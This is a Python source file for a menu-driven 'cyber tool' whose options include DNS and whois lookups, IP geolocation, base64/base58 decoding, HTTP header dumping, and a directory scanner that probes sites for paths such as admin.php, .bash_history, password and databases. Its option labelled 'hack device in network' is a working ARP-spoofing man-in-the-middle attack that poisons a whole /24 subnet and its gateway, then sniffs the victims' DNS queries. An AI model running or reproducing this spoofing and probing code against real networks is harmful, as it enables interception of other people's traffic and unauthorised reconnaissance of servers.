import pyfiglet
logo = pyfiglet.figlet_format("cyber tool")
print(logo)

import datetime
from datetime import datetime

import rich
from rich import print

import requests


print("              1.[italic red]ip adress of the server        [/]6.[italic red]general information of the")
print("              2.[italic red]web server status_code         [/]7.[italic red]ip location finder             ")
print("              3.[italic red]paths scaning                  [/]8.[italic red]base64 decode ")
print("              4.[italic red]base58 decode                  [/]9.[italic red]server information")      
print("              5.[italic red]oisnt tool                     [/]10.[italic red]hack device in network")
choice = input("choice your option : ")


if choice == "1" :
    import socket
    domain = input("Enter the domain of the wesite : ")
    
    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)
    
    ip = socket.gethostbyname(domain)
    print("[bold green][+]the ip adresse of the web server is : [/]",ip)

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "2" :
    url = input("Enter the url : ")

    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)

    response1 = requests.get(url)
    print("[bold green][+]the website status_code is : [/]",response1.status_code)

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "3" :    
    url = input("Enter the url : ")

    print("-"*50)    
    print("started time : " + str(datetime.now()))
    print("-"*50)

    paths = ["robots.txt" , "admin.php" , "admin.txt" , "admin.html" , "root.txt" , "secret" , "console" , "js" , "javascript" , "img" , "images" , "index.html" , "index.php" , "bing" , "logo" , "qwerty" , "1234" , "kernel" , "user" , ".bash_history" , ".history" , "Administration" , "Archive" , "Default" , "Documents" , "Downloads" , "id=" , "Book" , "lciense" , "login" , "Login" , "login.php" , "login.html" , "password" , "assests" , "Images" , "main.php" , "main.py" , "News" , "Music" , "accounts" , "databases"]
    
    for path in paths :
        full_url = f"{url}/{path}" 
        response2 = requests.get(full_url)

        if response2.status_code == 200 :
            print(f"[bold green][+]Found in url[/] : {url}  | path : {path} | full url : {full_url}")

        else :
            print(f"[bold red][-]Not Found in url[/] : {url} | path : {path} | status_code : {response2.status_code}")
        
    print("-"*50)    
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "4" :

    import base58
    
    user = input("Enter the base58 hash : ")

    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)

    encoded_text = user

    decoded_bytes = base58.b58decode(encoded_text)

    decoded_text = decoded_bytes.decode('utf-8')

    print(f"the hasch is : {decoded_text}")
    
    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "5" :
    pass

elif choice == "6" :
    import requests 

    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)
    
    domain = input("Enter the domain of the website : ")
    response = requests.get(f"https://api.whois.vu/?q={domain}")
    print(response.text)

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "7" :
    import geocoder
    import folium
    from geocoder import ip
    from folium import map, Marker  

    ip_target = input("Enter the target ip adress : ")

    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)

    target_ip = geocoder.ip(ip_target)
    location = target_ip.latlng
    traffic = folium.Map(location=location , zoom_start=10)
    folium.Marker(location=location).add_to(traffic)

    print(location)

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "8" : 
    import base64

    user = input("Enter the base64 hash : ")

    print("-"*50)
    print("started time : " + str(datetime.now()))
    print("-"*50)

    encoded_text = user

    decoded_bytes = base64.b64decode(encoded_text)

    decoded_text  = decoded_bytes.decode('utf-8')

    print(f"[italic green][+]the base64 hash is : {decoded_text}")

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "9" :
    url = input("Enter the url : ")

    print("-" * 50)
    print("started time : " + str(datetime.now()))
    print("-"*50)
    response3 = requests.head(url)

    for key,value in response3.headers.items():
        print(f"[bold green]{key}[/]:[bold red]{value}")

    print("-"*50)
    print("Thanks for using this tool.")
    print("Time finished : " + str(datetime.now()))
    print("-"*50)

elif choice == "10" :
    import logging
    from scapy.all import ARP , send , sniff 
    from scapy.layers.dns import DNS , DNSQR ,IP
    import threading
    logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

    def arp_spoof(target_ip,spoof_ip):  
        packet = ARP(op=2,pdst=target_ip,hwdst='ff:ff:ff:ff:ff:ff',psrc=spoof_ip)
        # ARP => ARP Requests |ARP Replay
        #op => option => 1:Requests,2:Replay
        #pdst => protocole distanation => target_ip 
        #hwdst => hardware destination => mac_adress | broadcast
        #psrc => protocol source => my ip
        send(packet,verbose=False)

    def dns_packet(packet):
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
            ip_src = packet[IP].src
            dns_query = packet[DNSQR].qname.decode()
            print(ip_src,dns_query)
    
    def start_arp(target_ip,getway_ip):
        while True :
            arp_spoof(target_ip,getway_ip)        
            arp_spoof(getway_ip,target_ip)

    target_ip = "192.168.1.0/24"
    getway_ip = "192.168.1.1"

    threading.Thread(target=start_arp,args=(target_ip,getway_ip),daemon=True).start()

    print("[+] Network traffic : 2026")
    print("-" * 40)
    print(f"{'IP Adress':<15} \t {'DNS Query':<30}")
    print("-" * 40)
    sniff(filter="udp port 53", prn=dns_packet,store=0)

else :
    print("invalid chose!")
